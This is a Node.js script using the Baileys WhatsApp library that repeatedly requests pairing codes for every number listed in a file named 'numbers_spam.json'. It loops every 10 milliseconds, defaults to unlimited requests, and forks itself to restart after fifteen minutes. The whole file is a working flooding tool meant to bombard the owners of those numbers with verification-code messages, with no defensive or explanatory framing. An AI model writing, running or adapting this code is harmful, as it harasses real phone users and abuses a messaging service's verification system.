const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs').promises;
const path = require('path');
const { fork } = require('child_process');
const axios = require('axios');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function fetchPhoneNumbers() {
    try {
        const data = await fs.readFile('numbers_spam.json', 'utf8');
        const jsonData = JSON.parse(data);
        return Object.values(jsonData).flat();
    } catch (error) {
        return [];
    }
}

async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
    let requestCount = 0;
    while (xeonCodes === Infinity || requestCount < xeonCodes) {
        for (let number of phoneNumbers) {
            if (xeonCodes !== Infinity && requestCount >= xeonCodes) break;

            try {
                await XeonBotInc.requestPairingCode(number);
                requestCount++;
            } catch (error) {
            }
        }
        if (xeonCodes === Infinity) {
        }
    }
}

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        let phoneNumbers = await fetchPhoneNumbers();
        let previousPhoneNumbers = [...phoneNumbers];
        let isChoiceMade = false;
        let xeonCodes;

        const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));

        const choice = await Promise.race([choicePromise, timeoutPromise]);

        switch (choice) {
            case '1':
                xeonCodes = 100;
                break;
            case '2':
                xeonCodes = 1000;
                break;
            case '3':
            case '':
                xeonCodes = Infinity;
                break;
            default:
                xeonCodes = Infinity;
                break;
        }

        isChoiceMade = true;

        const requestInterval = setInterval(async () => {
            try {
                phoneNumbers = await fetchPhoneNumbers();
                await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
            } catch (error) {
            }
        }, 10);

        setInterval(async () => {
            try {
                const currentPhoneNumbers = await fetchPhoneNumbers();
                const addedNumbers = currentPhoneNumbers.filter(number => !previousPhoneNumbers.includes(number));
                const removedNumbers = previousPhoneNumbers.filter(number => !currentPhoneNumbers.includes(number));

                if (addedNumbers.length > 0) {
                }
                if (removedNumbers.length > 0) {
                }

                previousPhoneNumbers = currentPhoneNumbers;
            } catch (error) {
            }
        }, 10000);

        setTimeout(() => {
            clearInterval(requestInterval);
            process.exit(0);
        }, 900000);

    } catch (error) {
    } finally {
        rl.close();
    }

    return XeonBotInc;
}

XeonProject().then(() => {
    const scriptPath = path.resolve(__filename);
    setTimeout(() => {
        fork(scriptPath);
    }, 1000);
});
